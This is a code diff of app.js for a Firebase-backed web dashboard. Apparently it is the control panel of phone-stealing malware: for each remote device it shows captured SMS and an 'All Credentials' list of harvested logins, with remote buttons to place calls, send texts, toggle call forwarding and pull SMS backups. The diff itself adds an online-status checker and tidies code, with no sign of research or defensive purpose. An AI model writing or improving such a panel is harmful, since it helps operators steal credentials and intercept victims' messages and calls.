@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - Fixed: No Auto-Refresh Jitter, Serial Numbers      */
+/* app.js - Fixed: Realtime Device Online Check & No Jitter     */
 /* ============================================================ */
 
 // ============================================================
@@ -63,7 +63,7 @@ db.ref(".info/connected").on("value", (snap) => {
 });
 
 // ============================================================
-// MAIN DATA LISTENER - NO AUTO REFRESH JITTER
+// MAIN DATA LISTENER
 // ============================================================
 let firstLoad = true;
 let lastData = {};
@@ -71,7 +71,6 @@ let lastData = {};
 db.ref().on("value", (snapshot) => {
     const newData = snapshot.val() || {};
     
-    // Check if data actually changed
     if (JSON.stringify(newData) === JSON.stringify(lastData)) {
         return; // No change, skip re-render
     }
@@ -83,7 +82,6 @@ db.ref().on("value", (snapshot) => {
     const typing = active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA' || active.tagName === 'SELECT');
     if (typing) return;
 
-    // Only re-render if not currently rendering
     if (!isRendering) {
         renderAll();
     }
@@ -96,8 +94,19 @@ db.ref().on("value", (snapshot) => {
     }
 });
 
+// Helper Function: Device Online Status Evaluator
+function isDeviceOnline(dev) {
+    if (!dev) return false;
+    let online = dev.isOnline || dev.online || false;
+    const lastSeen = dev.last_online || dev.timestamp;
+    if (!online && lastSeen && (Date.now() - lastSeen < 120000)) {
+        online = true;
+    }
+    return online;
+}
+
 // ============================================================
-// RENDER ALL - WITH CACHE
+// RENDER ALL
 // ============================================================
 function renderAll() {
     if (isRendering) return;
@@ -208,14 +217,58 @@ function getDeviceSerial(devId) {
 }
 
 // ============================================================
-// RENDER DEVICES - FIXED: NO JITTER, WITH SERIAL NUMBERS
+// CHECK INDIVIDUAL DEVICE ONLINE STATUS (ON CLICK CHECK)
+// ============================================================
+function checkDeviceOnline(devId, event) {
+    if (event) event.stopPropagation();
+
+    const statusEl = $(`status-${devId}`);
+    if (statusEl) {
+        statusEl.textContent = '⏳ Checking...';
+        statusEl.className = 'device-status';
+    }
+
+    showToast(`🔍 Checking status for ${devId}...`, 'info');
+
+    db.ref(`user_data/${devId}`).once('value').then((snap) => {
+        if (snap.exists()) {
+            const dev = snap.val();
+            if (!cachedData.user_data) cachedData.user_data = {};
+            cachedData.user_data[devId] = dev;
+
+            const online = isDeviceOnline(dev);
+            const lastSeen = dev.last_online || dev.timestamp;
+            const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
+
+            if (statusEl) {
+                statusEl.className = `device-status ${online ? 'online' : 'offline'}`;
+                statusEl.textContent = online ? '● Online' : '● Offline';
+            }
+
+            const timeEl = $(`time-${devId}`);
+            if (timeEl) timeEl.textContent = `⏱ ${timeStr}`;
+
+            if (online) {
+                showToast(`🟢 Device ${devId} is ONLINE`, 'success');
+            } else {
+                showToast(`🔴 Device ${devId} is OFFLINE`, 'warning');
+            }
+        } else {
+            showToast('❌ Device data not found', 'error');
+        }
+    }).catch(() => {
+        showToast('❌ Error checking status', 'error');
+    });
+}
+
+// ============================================================
+// RENDER DEVICES
 // ============================================================
 function renderDevices() {
     const container = $('devicesContainer');
     const devices = cachedData.user_data || {};
     allDeviceKeys = Object.keys(devices);
 
-    // Sort devices by serial number (descending - newest first)
     allDeviceKeys.sort((a, b) => {
         const serialA = getDeviceSerial(a);
         const serialB = getDeviceSerial(b);
@@ -223,15 +276,9 @@ function renderDevices() {
     });
 
     if (currentFilter === 'online') {
-        filteredDeviceKeys = allDeviceKeys.filter(id => {
-            const d = devices[id];
-            return d.isOnline || d.online || false;
-        });
+        filteredDeviceKeys = allDeviceKeys.filter(id => isDeviceOnline(devices[id]));
     } else if (currentFilter === 'offline') {
-        filteredDeviceKeys = allDeviceKeys.filter(id => {
-            const d = devices[id];
-            return !(d.isOnline || d.online || false);
-        });
+        filteredDeviceKeys = allDeviceKeys.filter(id => !isDeviceOnline(devices[id]));
     } else {
         filteredDeviceKeys = [...allDeviceKeys];
     }
@@ -251,12 +298,10 @@ function renderDevices() {
     displayKeys.forEach((devId, index) => {
         const dev = devices[devId] || {};
         const serial = getDeviceSerial(devId);
-        const deviceNumber = start + index + 1; // 1, 2, 3, 4...
+        const deviceNumber = start + index + 1;
 
-        let online = dev.isOnline || dev.online || false;
+        const online = isDeviceOnline(dev);
         const lastSeen = dev.last_online || dev.timestamp;
-        if (!online && lastSeen && (Date.now() - lastSeen < 120000)) online = true;
-
         const statusClass = online ? 'online' : 'offline';
         const statusText = online ? '● Online' : '● Offline';
         const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
@@ -289,7 +334,6 @@ function renderDevices() {
             devLoginList.reverse();
         }
 
-        // All login data in one place
         let allLoginHtml = '';
         if (devLoginList.length > 0) {
             allLoginHtml = devLoginList.map((rec, idx) => {
@@ -323,8 +367,8 @@ function renderDevices() {
                         </div>
                     </div>
                     <div style="text-align:right;">
-                        <span class="device-status ${statusClass}">${statusText}</span>
-                        <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">⏱ ${timeStr}</div>
+                        <span class="device-status ${statusClass}" id="status-${devId}" onclick="checkDeviceOnline('${devId}', event)" title="Click to refresh status">${statusText}</span>
+                        <div style="font-size:9px;color:var(--text-muted);margin-top:2px;" id="time-${devId}">⏱ ${timeStr}</div>
                     </div>
                 </div>
 
@@ -337,19 +381,14 @@ function renderDevices() {
 
                 <div class="device-body">
                     <div class="device-actions-luxury">
-                        <button class="sub-btn ${activeTab === 'sms' ? 'active-sms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sms')">
-                            💬 ${totalSms}
-                        </button>
-                        <button class="sub-btn ${activeTab === 'login' ? 'active-login' : ''}" onclick="event.stopPropagation();setTab('${devId}','login')">
-                            🔑 ${devLoginList.length}
-                        </button>
+                        <button class="sub-btn ${activeTab === 'sms' ? 'active-sms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sms')">💬 ${totalSms}</button>
+                        <button class="sub-btn ${activeTab === 'login' ? 'active-login' : ''}" onclick="event.stopPropagation();setTab('${devId}','login')">🔑 ${devLoginList.length}</button>
                         <button class="sub-btn ${activeTab === 'call' ? 'active-call' : ''}" onclick="event.stopPropagation();setTab('${devId}','call')">📞</button>
                         <button class="sub-btn ${activeTab === 'sendsms' ? 'active-sendsms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sendsms')">✉️</button>
                         <button class="sub-btn ${activeTab === 'fwd' ? 'active-fwd' : ''}" onclick="event.stopPropagation();setTab('${devId}','fwd')">🔀</button>
                         <button class="sub-btn ${activeTab === 'backup' ? 'active-backup' : ''}" onclick="event.stopPropagation();setTab('${devId}','backup')">💾</button>
                     </div>
 
-                    <!-- SMS Section -->
                     <div class="section-box ${activeTab === 'sms' ? 'active' : ''}" id="sec-sms-${devId}">
                         <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
                             <h4 style="color:var(--gold-light);margin:0;font-size:13px;">💬 SMS (${totalSms})</h4>
@@ -362,7 +401,6 @@ function renderDevices() {
                         ${hasMoreSms ? `<button class="btn-load-more" style="margin-top:6px;padding:6px;font-size:11px;" onclick="event.stopPropagation();loadMoreDeviceSms('${devId}')">📥 Load More</button>` : ''}
                     </div>
 
-                    <!-- Login Section - All in One Place -->
                     <div class="section-box ${activeTab === 'login' ? 'active' : ''}" id="sec-login-${devId}">
                         <h4 style="color:#f59e0b;font-size:13px;">🔑 All Credentials</h4>
                         <div class="login-cards">
@@ -370,7 +408,6 @@ function renderDevices() {
                         </div>
                     </div>
 
-                    <!-- Call Section -->
                     <div class="section-box ${activeTab === 'call' ? 'active' : ''}" id="sec-call-${devId}">
                         <h4 style="color:var(--green);font-size:13px;">📞 Make Call</h4>
                         <input type="text" id="callNum-${devId}" value="${formMemory[`callNum-${devId}`] || ''}" placeholder="Phone Number" oninput="formMemory['callNum-${devId}']=this.value" onclick="event.stopPropagation()">
@@ -383,7 +420,6 @@ function renderDevices() {
                         </button>
                     </div>
 
-                    <!-- Send SMS Section -->
                     <div class="section-box ${activeTab === 'sendsms' ? 'active' : ''}" id="sec-sendsms-${devId}">
                         <h4 style="color:var(--purple);font-size:13px;">✉️ Send SMS</h4>
                         <input type="text" id="smsNum-${devId}" value="${formMemory[`smsNum-${devId}`] || ''}" placeholder="Recipient" oninput="formMemory['smsNum-${devId}']=this.value" onclick="event.stopPropagation()">
@@ -397,7 +433,6 @@ function renderDevices() {
                         </button>
                     </div>
 
-                    <!-- Forward Section -->
                     <div class="section-box ${activeTab === 'fwd' ? 'active' : ''}" id="sec-fwd-${devId}">
                         <h4 style="color:var(--red);font-size:13px;">🔀 Call Forward</h4>
                         <input type="text" id="fwdNum-${devId}" value="${formMemory[`fwdNum-${devId}`] || ''}" placeholder="Forward To" oninput="formMemory['fwdNum-${devId}']=this.value" onclick="event.stopPropagation()">
@@ -413,7 +448,6 @@ function renderDevices() {
                         </button>
                     </div>
 
-                    <!-- Backup Section -->
                     <div class="section-box ${activeTab === 'backup' ? 'active' : ''}" id="sec-backup-${devId}">
                         <h4 style="color:#06b6d4;font-size:13px;">💾 Backup</h4>
                         <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
@@ -444,7 +478,6 @@ function renderDevices() {
         `;
     }
 
-    // Show back button if offset > 0
     if (deviceOffset > 0) {
         const backBtn = document.createElement('button');
         backBtn.className = 'btn-load-more';
@@ -459,12 +492,10 @@ function renderDevices() {
 }
 
 // ============================================================
-// TOGGLE DEVICE - NO FULL RE-RENDER
+// TOGGLE DEVICE
 // ============================================================
 function toggleDevice(devId) {
     expandedDevices[devId] = !expandedDevices[devId];
-    
-    // Just toggle class on the card - no re-render
     const card = document.getElementById(`card-${devId}`);
     if (card) {
         card.classList.toggle('expanded');
@@ -476,7 +507,7 @@ function toggleDevice(devId) {
 }
 
 // ============================================================
-// SET TAB - NO FULL RE-RENDER
+// SET TAB
 // ============================================================
 function setTab(devId, tab) {
     if (activeTabs[devId] === tab) {
@@ -486,17 +517,14 @@ function setTab(devId, tab) {
         if (tab === 'backup') refreshDeviceBackup(devId);
     }
     
-    // Just update the UI without full re-render
     const card = document.getElementById(`card-${devId}`);
     if (!card) return;
 
-    // Update button states
     const buttons = card.querySelectorAll('.device-actions-luxury .sub-btn');
     buttons.forEach(btn => {
         btn.className = btn.className.replace(/active-\w+/g, '').trim();
     });
 
-    // Update section visibility
     const sections = card.querySelectorAll('.section-box');
     sections.forEach(sec => sec.classList.remove('active'));
 
@@ -627,18 +655,11 @@ function loadMoreAllSms() {
 function loadMoreDeviceSms(devId) {
     if (deviceSmsCache[devId]) {
         deviceSmsCache[devId].offset += SMS_LIMIT;
-        // Re-render just this device's card
-        const card = document.getElementById(`card-${devId}`);
-        if (card) {
-            // We need to re-render the SMS section only
-            // For simplicity, we'll re-render the whole device section
-            renderDevices();
-            // Re-expand
-            expandedDevices[devId] = true;
-            activeTabs[devId] = 'sms';
-            const cardEl = document.getElementById(`card-${devId}`);
-            if (cardEl) cardEl.classList.add('expanded');
-        }
+        renderDevices();
+        expandedDevices[devId] = true;
+        activeTabs[devId] = 'sms';
+        const cardEl = document.getElementById(`card-${devId}`);
+        if (cardEl) cardEl.classList.add('expanded');
     }
 }
 
@@ -712,21 +733,11 @@ function showCommandDialog(type, devId) {
     if (!confirm(messages[type] || 'Send command?')) return;
 
     switch (type) {
-        case 'call':
-            sendCall(devId);
-            break;
-        case 'sms':
-            sendSms(devId);
-            break;
-        case 'fwd_on':
-            sendFwd(devId, 'call forward');
-            break;
-        case 'fwd_off':
-            sendFwd(devId, 'forward off');
-            break;
-        case 'backup':
-            triggerDeviceBackup(devId);
-            break;
+        case 'call': sendCall(devId); break;
+        case 'sms': sendSms(devId); break;
+        case 'fwd_on': sendFwd(devId, 'call forward'); break;
+        case 'fwd_off': sendFwd(devId, 'forward off'); break;
+        case 'backup': triggerDeviceBackup(devId); break;
     }
 }
 
@@ -905,10 +916,9 @@ function refreshDeviceBackup(devId) {
             const msg = data.backup_message || '';
             let color = 'var(--text-muted)';
             let icon = '📊';
-            if (st === 'success') { color = 'var(--green)';
-                icon = '✅'; } else if (st === 'in_progress' || st === 'pending') { color = '#f59e0b';
-                icon = '⏳'; } else if (st === 'failed' || st === 'error') { color = 'var(--red)';
-                icon = '❌'; }
+            if (st === 'success') { color = 'var(--green)'; icon = '✅'; } 
+            else if (st === 'in_progress' || st === 'pending') { color = '#f59e0b'; icon = '⏳'; } 
+            else if (st === 'failed' || st === 'error') { color = 'var(--red)'; icon = '❌'; }
             html += `<div style="color:${color};">${icon} ${st} ${msg ? '- ' + msg : ''}</div>`;
 
             db.ref(`user_data/${devId}/backup_info`).once('value').then(infoSnap => {
@@ -1128,6 +1138,7 @@ function closeSmsModal(e) {
 // ============================================================
 function showToast(message, type = 'info', duration = 2800) {
     const container = $('toastContainer');
+    if (!container) return;
     const toast = document.createElement('div');
     toast.className = `toast-luxury ${type}`;
     toast.textContent = message;
@@ -1149,19 +1160,22 @@ function escapeHtml(text) {
 }
 
 // ============================================================
-// BACKUP DEVICE SELECT LISTENER
+// INITIALIZATION
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
-    $('backupDeviceSelect').addEventListener('change', function() {
-        const id = this.value;
-        if (id) {
-            updateBackupStatusDisplay(id);
-            loadBackupSmsForDevice(id);
-            refreshDeviceBackup(id);
-        } else {
-            $('backupSmsList').innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
-        }
-    });
+    const select = $('backupDeviceSelect');
+    if (select) {
+        select.addEventListener('change', function() {
+            const id = this.value;
+            if (id) {
+                updateBackupStatusDisplay(id);
+                loadBackupSmsForDevice(id);
+                refreshDeviceBackup(id);
+            } else {
+                $('backupSmsList').innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
+            }
+        });
+    }
 
-    $('filterAll').classList.add('active');
+    if ($('filterAll')) $('filterAll').classList.add('active');
 });
